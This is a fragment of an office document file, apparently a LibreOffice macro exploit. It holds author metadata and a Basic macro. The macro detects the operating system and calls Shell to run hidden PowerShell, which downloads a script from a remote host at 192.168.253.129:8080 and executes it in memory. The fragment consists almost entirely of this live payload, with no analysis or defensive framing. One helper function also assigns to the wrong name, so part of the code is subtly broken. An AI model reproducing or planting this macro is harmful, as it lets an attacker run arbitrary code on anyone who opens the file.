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nn3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2017-02-06T15:21:59.64</dc:date>
    <dc:creator>sinn3r </dc:creator>
    <meta:editing-duration>PT4M1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Dim os as string
      os = GetOS
      If os = "windows" OR os = "osx" OR os = "linux" Then
        Exploit
      end If
    End Sub

    Sub Exploit
      Shell("cmd.exe /C ""powershell.exe -nop -w hidden -c $z=new-object net.webclient;$z.proxy=[Net.WebRequest]::GetSystemWebProxy();$z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $z.downloadstring('http://192.168.253.129:8080/mNtvbZQ9hQ0mD');""")
    End Sub

    Function GetOS() as string
      select case getGUIType
        case 1:
          GetOS = "windows"
        case 3:
          GetOS = "osx"
        case 4:
          GetOS = "linux"
      end select
    End Function

    Function GetExtName() as string
      select case GetOS
        case "windows"
          GetFileName = "exe"
        case else
          GetFileName = "bin"
      end select
    End Function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